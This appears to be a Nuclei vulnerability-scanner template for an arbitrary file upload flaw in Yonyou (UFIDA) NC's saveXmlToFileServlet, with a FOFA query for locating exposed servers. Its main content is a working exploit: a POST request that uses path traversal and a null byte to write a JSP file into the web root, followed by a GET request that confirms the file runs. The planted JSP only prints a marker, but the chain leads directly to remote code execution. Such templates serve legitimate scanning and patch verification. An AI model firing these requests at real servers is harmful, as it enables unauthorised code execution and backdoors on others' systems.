id: yongyouNC-saveXmlToFIleServlet-File-upload-XVE-2024-6507

info:
  name: "用友 NC saveXmlToFIleServlet 组件任意文件上传漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: app="用友-UFIDA-NC"
      用友NC系统saveXmlToFIleServlet组件存在文件上传逻辑缺陷，攻击者可利用该缺陷向服务器上传任意可执行文件。通过构造恶意文件内容，可实现远程代码执行并植入持久化后门，最终导致服务器权限被完全控制。该漏洞的利用链可绕过常规文件类型校验机制，形成对Web服务器的纵深渗透威胁。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488162&idx=1&sn=c0a4ed867540fb32daba33e4c392a250&chksm=c267a791f5102e875ebe58fe417f4739c0bda6ea739daedfedfd8c6a8a1036608e04973a2bf6&token=350950895&lang=zh_CN#rd
  tags: 用友

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /portal/pt/servlet/saveXmlToFileServlet/doPost?pageId=login&filename=..\\..\\..\\webapps\\nc_web\\{{username}}.jsp%00 HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    Content-Type: application/octet-stream

    %3C%25out.print%28%22pboyjnnrfipmplsukdeczudsefxmywe%22%29%3B%25%3E
- raw:
  - |
    GET /{{username}}.jsp HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'pboyjnnrfipmplsukdeczudsefxmywe'
  - type: status
    status:
    - 200
